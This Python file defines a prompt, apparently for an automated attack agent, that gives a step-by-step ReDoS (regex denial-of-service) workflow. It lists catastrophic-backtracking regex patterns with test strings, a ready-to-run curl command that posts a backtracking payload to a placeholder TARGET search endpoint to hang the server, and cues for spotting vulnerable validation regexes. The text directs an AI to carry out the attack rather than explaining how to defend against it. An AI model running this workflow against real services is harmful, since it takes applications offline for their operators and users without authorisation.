"""
ReDoS (Regex Denial of Service) Attack Skill Prompt.
"""

REDOS_SKILL_PROMPT = r"""
## ATTACK SKILL: REDOS (REGEX DENIAL OF SERVICE)

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
Find user input that passes through regex validation. Test with catastrophic backtracking patterns:
```
(a+)+b → test: aaaaaaaaaaaaaaaaaaaa!
([a-zA-Z]+)* → test: aaaaaaaaaaaaaaaaaaaa!
(a|aa)+ → test: aaaaaaaaaaaaaaaaaaaa!
(\w+)+ → test: aaaaaaaaaaaaaaaaaaaa!
```

#### STEP 2: EXPLOITATION
Send input that triggers exponential backtracking:
```bash
python3 -c "print('a' * 30 + '!')" | curl -X POST https://TARGET/search -d @-
```
→ Server hangs for seconds/minutes → DoS.

#### STEP 3: IDENTIFY VULNERABLE PATTERNS
Look for these in error messages or source code:
- Nested quantifiers: `(x+)+`, `(x*)*`, `(x+)*`
- Alternation with overlap: `(x|xx)+`, `(a|aa|aaa)+`
- Lookahead/lookbehind with quantifiers

#### ANTI-PATTERNS: Don't just test one pattern — the vulnerable regex may be specific to the application's validation logic. Time the response to detect slow-downs.
"""
